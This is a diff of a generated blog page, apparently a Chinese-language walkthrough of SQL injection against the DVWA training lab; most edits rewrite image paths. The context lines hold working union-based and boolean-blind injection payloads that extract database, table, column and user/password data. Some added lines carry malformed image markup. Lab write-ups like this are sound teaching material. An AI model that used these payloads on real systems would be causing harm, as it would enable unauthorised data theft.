@@ -357,8 +357,8 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 <p>输入1，正常回显；输入1’报错，说明有注入点</p>
 </blockquote>
 <figure class="image-box">
-                <img src="/SQL注入/1597150763322.png" alt="/SQL注入/1597150763322" title class>
-                <p>/SQL注入/1597150763322</p>
+                <img src="/img/SQL注入/1597150763322.png" alt="/img/SQL注入/1597150763322" title class>
+                <p>/img/SQL注入/1597150763322</p>
             </figure>
 
 <p>（2）判断字段数</p>
@@ -367,8 +367,8 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 </blockquote>
 <p><code>1&#39; order 1#</code></p>
 <figure class="image-box">
-                <img src="/SQL注入/1597151437412.png" alt="/SQL注入/1597151437412" title class>
-                <p>/SQL注入/1597151437412</p>
+                <img src="/img/SQL注入/1597151437412.png" alt="/img/SQL注入/1597151437412" title class>
+                <p>/img/SQL注入/1597151437412</p>
             </figure>
 
 <p>（3）查看回显位置，并进行union注入查询</p>
@@ -377,8 +377,8 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 </blockquote>
 <p><code>-1&#39; union select 1,2#</code></p>
 <figure class="image-box">
-                <img src="/SQL注入/1597151508527.png" alt="/SQL注入/1597151508527" title class>
-                <p>/SQL注入/1597151508527</p>
+                <img src="/img/SQL注入/1597151508527.png" alt="/img/SQL注入/1597151508527" title class>
+                <p>/img/SQL注入/1597151508527</p>
             </figure>
 
 <blockquote>
@@ -386,8 +386,8 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 </blockquote>
 <p><code>-1&#39; union select database(),version()#</code></p>
 <figure class="image-box">
-                <img src="/SQL注入/1597151782271.png" alt="/SQL注入/1597151782271" title class>
-                <p>/SQL注入/1597151782271</p>
+                <img src="/img/SQL注入/1597151782271.png" alt="/img/SQL注入/1597151782271" title class>
+                <p>/img/SQL注入/1597151782271</p>
             </figure>
 
 <blockquote>
@@ -395,8 +395,8 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 </blockquote>
 <p><code>-1&#39; union select 1,schema_name from information_schema.schemata#</code></p>
 <figure class="image-box">
-                <img src="/SQL注入/1597152579142.png" alt="/SQL注入/1597152579142" title class>
-                <p>/SQL注入/1597152579142</p>
+                <img src="/img/SQL注入/1597152579142.png" alt="/img/SQL注入/1597152579142" title class>
+                <p>/img/SQL注入/1597152579142</p>
             </figure>
 
 <blockquote>
@@ -404,8 +404,8 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 </blockquote>
 <p><code>-1&#39; union select 1,table_name from information_schema.tables where table_schema=&quot;dvwa&quot;#</code></p>
 <figure class="image-box">
-                <img src="/SQL注入/1597153650280.png" alt="/SQL注入/1597153650280" title class>
-                <p>/SQL注入/1597153650280</p>
+                <img src="/img/SQL注入/1597153650280.png" alt="/img/SQL注入/1597153650280" title class>
+                <p>/img/SQL注入/1597153650280</p>
             </figure>
 
 <blockquote>
@@ -413,8 +413,8 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 </blockquote>
 <p><code>-1&#39; union select 1,column_name from information_schema.columns where table_name=&quot;users&quot;#</code></p>
 <figure class="image-box">
-                <img src="/SQL注入/1597153814658.png" alt="/SQL注入/1597153814658" title class>
-                <p>/SQL注入/1597153814658</p>
+                <img src="/img/SQL注入/1597153814658.png" alt="/img/SQL注入/1597153814658" title class>
+                <p>/img/SQL注入/1597153814658</p>
             </figure>
 
 <blockquote>
@@ -422,149 +422,89 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 </blockquote>
 <p><code>-1&#39; union select user,password from users#</code></p>
 <figure class="image-box">
-                <img src="/SQL注入/1597154167541.png" alt="/SQL注入/1597154167541" title class>
-                <p>/SQL注入/1597154167541</p>
+                <img src="/img/SQL注入/1597154167541.png" alt="/img/SQL注入/1597154167541" title class>
+                <p>/img/SQL注入/1597154167541</p>
             </figure>
 
 <h5 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h5><blockquote>
 <p>这里限制了输入，我们需要抓包进行修改</p>
 </blockquote>
-<p> <img src="/SQL%E6%B3%A8%E5%85%A5/1597157686281.png" alt="/SQL注入/1597157686281"></p>
+<p> <img src="/img/SQL%E6%B3%A8%E5%85%A5/1597157686281.png" alt="/img/SQL注入/1597157686281"></p>
 <blockquote>
 <p>和前面一样尝试我们发现，但这里是整数型不需要闭合，其余都和前面都一样，所以查看数据的具体步骤就省略了</p>
 </blockquote>
 <figure class="image-box">
-                <img src="/SQL注入/1597157823757.png" alt="/SQL注入/1597157823757" title class>
-                <p>/SQL注入/1597157823757</p>
+                <img src="/img/SQL注入/1597157823757.png" alt="/img/SQL注入/1597157823757" title class>
+                <p>/img/SQL注入/1597157823757</p>
             </figure>
 
 <h5 id="High"><a href="#High" class="headerlink" title="High"></a>High</h5><blockquote>
 <p>这里跳转到另外一个界面输入信息，防止了自动化SQL注入，但是方法依旧和(LOW)级别一样，只是换了个位置输入，过程就不演示啦。</p>
 </blockquote>
 <figure class="image-box">
-                <img src="/SQL注入/1597158059688.png" alt="/SQL注入/1597158059688" title class>
-                <p>/SQL注入/1597158059688</p>
+                <img src="/img/SQL注入/1597158059688.png" alt="/img/SQL注入/1597158059688" title class>
+                <p>/img/SQL注入/1597158059688</p>
             </figure>
 
 <figure class="image-box">
-                <img src="/SQL注入/1597158084811.png" alt="/SQL注入/1597158084811" title class>
-                <p>/SQL注入/1597158084811</p>
+                <img src="/img/SQL注入/1597158084811.png" alt="/img/SQL注入/1597158084811" title class>
+                <p>/img/SQL注入/1597158084811</p>
             </figure>
 
 <figure class="image-box">
-                <img src="/SQL注入/1597158559411.png" alt="/SQL注入/1597158559411" title class>
-                <p>/SQL注入/1597158559411</p>
+                <img src="/img/SQL注入/1597158559411.png" alt="/img/SQL注入/1597158559411" title class>
+                <p>/img/SQL注入/1597158559411</p>
             </figure>
 
-<h4 id="盲注-1"><a href="#盲注-1" class="headerlink" title="盲注"></a>盲注</h4><h5 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h5><figure class="image-box">
-                <img src="1597160077983.png" alt="1597160077983" title class>
-                <p>1597160077983</p>
-            </figure>
-
-<figure class="image-box">
-                <img src="1597160098860.png" alt="1597160098860" title class>
-                <p>1597160098860</p>
-            </figure>
-
+<h4 id="盲注-1"><a href="#盲注-1" class="headerlink" title="盲注"></a>盲注</h4><h5 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h5><p>![/img/SQL注入/1597160077983][/img/SQL注入/1597160077983.png)</p>
+<p>![/img/SQL注入/1597160098860][/img/SQL注入/1597160098860.png)</p>
 <blockquote>
 <p>通过输入发现，这个输入框只会根据输入的内容是否存在数据库中，返回两种结果，所以只能使用盲注，通过测试发现需要<code>&#39;</code>进行闭合，这里采用布尔盲注方式进行测试数据库长度，时间盲注同样可以。</p>
 </blockquote>
 <p><code>1&#39; and (length(database()))&lt;4#</code></p>
-<figure class="image-box">
-                <img src="1597161173004.png" alt="1597161173004" title class>
-                <p>1597161173004</p>
-            </figure>
-
+<p>![/img/SQL注入/1597161173004][/img/SQL注入/1597161173004.png)</p>
 <p><code>1&#39; and (length(database()))&lt;5#</code></p>
-<figure class="image-box">
-                <img src="1597161192485.png" alt="1597161192485" title class>
-                <p>1597161192485</p>
-            </figure>
-
+<p>![/img/SQL注入/1597161192485][/img/SQL注入/1597161192485.png)</p>
 <blockquote>
 <p>发现长度4和5结果不同，可以确认数据库长度为4，然后开始猜名称</p>
 </blockquote>
 <p><code>1&#39; and (ascii(substr(database(),1,1)))&gt;100#</code></p>
-<figure class="image-box">
-                <img src="1597161443050.png" alt="1597161443050" title class>
-                <p>1597161443050</p>
-            </figure>
-
+<p>![/img/SQL注入/1597161443050][/img/SQL注入/1597161443050.png)</p>
 <p><code>1&#39; and (ascii(substr(database(),1,1)))&gt;99#</code></p>
-<figure class="image-box">
-                <img src="1597161459673.png" alt="1597161459673" title class>
-                <p>1597161459673</p>
-            </figure>
-
+<p>![/img/SQL注入/1597161459673][/img/SQL注入/1597161459673.png)</p>
 <blockquote>
 <p>通过查询发现大于99但是不大于100，发现是100，100对应的ASCII为d，同样方法依次测出后面三位，发现数据库名称为dvwa,接下来开始查表</p>
 </blockquote>
 <p><code>1&#39; and(length((select table_name from information_schema.tables where table_schema=database() limit 0,1)))&lt;10#</code></p>
-<figure class="image-box">
-                <img src="1597162575060.png" alt="1597162575060" title class>
-                <p>1597162575060</p>
-            </figure>
-
+<p>![/img/SQL注入/1597162575060][/img/SQL注入/1597162575060.png)</p>
 <p><code>1&#39; and(length((select table_name from information_schema.tables where table_schema=database() limit 0,1)))&lt;9#</code></p>
-<figure class="image-box">
-                <img src="1597162589046.png" alt="1597162589046" title class>
-                <p>1597162589046</p>
-            </figure>
-
+<p>![/img/SQL注入/1597162589046][/img/SQL注入/1597162589046.png)</p>
 <blockquote>
 <p>不小于9，小于10可以判断长度为9，然后开始猜名称</p>
 </blockquote>
 <p><code>1&#39; and(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&lt;103#</code></p>
-<figure class="image-box">
-                <img src="1597162797589.png" alt="1597162797589" title class>
-                <p>1597162797589</p>
-            </figure>
-
+<p>![/img/SQL注入/1597162797589][/img/SQL注入/1597162797589.png)</p>
 <p><code>1&#39; and(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&lt;104#</code></p>
-<figure class="image-box">
-                <img src="1597162862636.png" alt="1597162862636" title class>
-                <p>1597162862636</p>
-            </figure>
-
+<p>![/img/SQL注入/1597162862636][/img/SQL注入/1597162862636.png)</p>
 <blockquote>
 <p>小于103，不小于104，所以是103，对应的ASCII为g，同样方法猜到后面结果为guestbook。然后开始猜字段，这里猜第三个字段</p>
 </blockquote>
 <p><code>1&#39; and (length((select column_name from information_schema.columns where table_name=&quot;guestbook&quot; limit 2,1)))&lt;5#</code></p>
-<figure class="image-box">
-                <img src="1597163115723.png" alt="1597163115723" title class>
-                <p>1597163115723</p>
-            </figure>
-
+<p>![/img/SQL注入/1597163115723][/img/SQL注入/1597163115723.png)</p>
 <p><code>1&#39; and (length((select column_name from information_schema.columns where table_name=&quot;guestbook&quot; limit 2,1)))&lt;4#</code></p>
-<figure class="image-box">
-                <img src="1597163128591.png" alt="1597163128591" title class>
-                <p>1597163128591</p>
-            </figure>
-
+<p>![/img/SQL注入/1597163128591][/img/SQL注入/1597163128591.png)</p>
 <blockquote>
 <p>小于5不小于4，所以结果是长度是4，然后猜名称</p>
 </blockquote>
 <p><code>1&#39; and (ascii(substr((select column_name from information_schema.columns where table_name=&quot;guestbook&quot; limit 2,1),1,1)))&gt;110#</code></p>
-<figure class="image-box">
-                <img src="1597163275391.png" alt="1597163275391" title class>
-                <p>1597163275391</p>
-            </figure>
-
+<p>![/img/SQL注入/1597163275391][/img/SQL注入/1597163275391.png)</p>
 <p><code>1&#39; and (ascii(substr((select column_name from information_schema.columns where table_name=&quot;guestbook&quot; limit 2,1),1,1)))&gt;109#</code></p>
-<figure class="image-box">
-                <img src="1597163530646.png" alt="1597163530646" title class>
-                <p>1597163530646</p>
-            </figure>
-
+<p>![/img/SQL注入/1597163530646][/img/SQL注入/1597163530646.png)</p>
 <blockquote>
 <p>大于109，不大于110，所以是110对应n，依次重复猜到为name，然后开始猜内容长度,这里用=猜</p>
 </blockquote>
 <p><code>1&#39; and (length(( select name from guestbook limit 0,1)))=4#</code></p>
-<figure class="image-box">
-                <img src="1597163675016.png" alt="1597163675016" title class>
-                <p>1597163675016</p>
-            </figure>
-
+<p>![/img/SQL注入/1597163675016][/img/SQL注入/1597163675016.png)</p>
 <blockquote>
 <p>猜到4为正确的，所以长度为4，然后猜具体内容</p>
 </blockquote>
@@ -575,22 +515,14 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 <blockquote>
 <p>最终猜到guestbook表中的name字段，第一个内容为test</p>
 </blockquote>
-<h5 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h5><figure class="image-box">
-                <img src="1597162058638.png" alt="1597162058638" title class>
-                <p>1597162058638</p>
-            </figure>
-
+<h5 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h5><p>![/img/SQL注入/1597162058638][/img/SQL注入/1597162058638.png)</p>
 <blockquote>
 <p>和low注入一样，只不过需要抓包进行数据修改，参数是整数型，不需要闭合，其余不变</p>
 </blockquote>
 <h5 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h5><blockquote>
 <p>和前面一样的作用，只是为了防止自动化SQL注入</p>
 </blockquote>
-<figure class="image-box">
-                <img src="1597162129663.png" alt="1597162129663" title class>
-                <p>1597162129663</p>
-            </figure>
-
+<p>![/img/SQL注入/1597162129663][/img/SQL注入/1597162129663.png)</p>
 <h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ol>
 <li>对用户的输入进行校验通过正则表达式，限制输入长度，对单引号和 双引号等进行转换</li>
 <li>机密信息不要明文存放，采用机密处理</li>
@@ -1938,9 +1870,9 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
         
         <tags>
             
-            <tag> VUE </tag>
-            
             <tag> 前端 </tag>
+            
+            <tag> VUE </tag>
             
         </tags>
         
@@ -2387,9 +2319,9 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
         
         <tags>
             
-            <tag> VUE </tag>
-            
             <tag> 前端 </tag>
+            
+            <tag> VUE </tag>
             
         </tags>
         
